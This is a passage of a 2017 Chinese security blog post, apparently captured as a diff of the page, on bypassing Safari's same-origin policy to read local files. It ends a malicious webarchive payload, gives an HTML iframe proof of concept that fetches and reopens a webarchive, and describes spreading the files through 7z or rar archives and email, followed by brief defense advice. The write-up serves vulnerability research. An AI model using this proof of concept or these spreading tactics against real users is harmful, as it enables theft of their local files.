&lt;key&gt;WebResourceTextEncodingName&lt;/key&gt;</div><div class="line">		&lt;string&gt;UTF-8&lt;/string&gt;</div><div class="line">		&lt;key&gt;WebResourceURL&lt;/key&gt;</div><div class="line">		&lt;string&gt;file://&lt;/string&gt;</div><div class="line">	&lt;/dict&gt;</div><div class="line">&lt;/dict&gt;</div><div class="line">&lt;/plist&gt;</div></pre></td></tr></table></figure>
+<p>上面data中的base64数据解码就是一段恶意的javascript脚本。</p>
+<h3 id="网络传播xhtm文件"><a href="#网络传播xhtm文件" class="headerlink" title="网络传播xhtm文件"></a>网络传播xhtm文件</h3><p>是不是只要Safari本地打开类似xhtm恶意文档，攻击都能生效呢？结果并不是，macOS文件是有属性信息的，从网上下载的文件会有来源信息， 如: <code>http://127.0.0.1:8000/Poc.xhtm</code>, 本地打开这种文件，攻击并不生效。</p>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/006.png" alt="006.png" title="">
+<p>可见，打开带网络来源属性的的文件，会被Safari的同源策略拦截，导致攻击不能生效，那么通过邮件发送恶意文件再本地打开的方式，也是难以成功了。</p>
+<p>那么是不是没有办法进行网络传播了呢，答案是否定的，macOS上的应用并不是都会保留文件的网络属性。</p>
+<ul>
+<li><p>文件压缩</p>
+<p>macOS自带的解压工具解压文件仍旧会保留网络属性，但是第三方应用如:<code>Entropy</code>解压文件会丢失网络属性，然后用Safari本地打开可导致攻击成功。那么可以将文件压缩为macOS自带解压工具解压不了的格式，如: 7z, rar等，然后通过网络下载或邮件进行传播。</p>
+</li>
+<li><p>社交软件传播</p>
+<p>使用微信和QQ接收文件，仍旧会保留网络属性，无法成功利用</p>
+</li>
+</ul>
+<p>感谢wupco，给出了一种可以用来网络传播html文档进行攻击的方式，利用iframe下载webarchive文件后本地读取webarchive文件进行攻击的方式。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">test</div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">exp</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">      <span class="keyword">var</span> iframe2 = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></div><div class="line"><span class="javascript">            iframe2.src=<span class="string">"./PoC0.webarchive"</span>;</span></div><div class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(iframe2);</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></div><div class="line"><span class="javascript">    iframe.src=<span class="string">"http://0:8000/PoC0.webarchive"</span>;</span></div><div class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(iframe);</span></div><div class="line"><span class="javascript">    setTimeout(<span class="string">"exp()"</span>,<span class="number">1500</span>);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="网络传播webarchive文件"><a href="#网络传播webarchive文件" class="headerlink" title="网络传播webarchive文件"></a>网络传播webarchive文件</h3><p>测试发现，通过网页或邮件等方式下载到本地的webarchive文件，用Safari打开，攻击是有效的。 唯一不足的是Safari会弹一个警示框显示文件是网络下载的，需要用户确认才能打开。</p>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/007.png" alt="007.png" title="">
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>针对这种攻击，有效的防御就是不要使用Safari浏览器打开本地文件, 不要将默认浏览器设置为Safari, 修改为Chrome等浏览器。</p>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="https://xakep.ru/2017/07/06/safari-localfile-read/" target="_blank" rel="external">https://xakep.ru/2017/07/06/safari-localfile-read/</a></li>
+<li><a href="https://lab.wallarm.com/hunting-the-files-34caa0c1496" target="_blank" rel="external">https://lab.wallarm.com/hunting-the-files-34caa0c1496</a></li>
+<li><a href="http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article" target="_blank" rel="external">http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article</a></li>
+<li><a href="https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/" target="_blank" rel="external">https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/同源策略/" rel="tag"># 同源策略</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/22/Spring-MVC-自动绑定漏洞/" rel="next" title="Spring MVC 自动绑定漏洞">
+                <i class="fa fa-chevron-left"></i> Spring MVC 自动绑定漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/07/unicode绕过xss/" rel="prev" title="unicode绕过xss">
+                unicode绕过xss <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars3.githubusercontent.com/u/15061633"
+               alt="Ethan" />
+          <p class="site-author-name" itemprop="name">Ethan</p>
+           
+              <p class="site-description motion-element" itemprop="description">personal blog :)</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友链
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Safari-同源策略绕过"><span class="nav-number">1.</span> <span class="nav-text">Safari 同源策略绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取本地文件"><span class="nav-number">2.</span> <span class="nav-text">读取本地文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Safari打开恶意文档"><span class="nav-number">3.</span> <span class="nav-text">Safari打开恶意文档</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#网络传播xhtm文件"><span class="nav-number">3.1.</span> <span class="nav-text">网络传播xhtm文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络传播webarchive文件"><span class="nav-number">3.2.</span> <span class="nav-text">网络传播webarchive文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ref"><span class="nav-number">5.</span> <span class="nav-text">Ref</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ethan</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
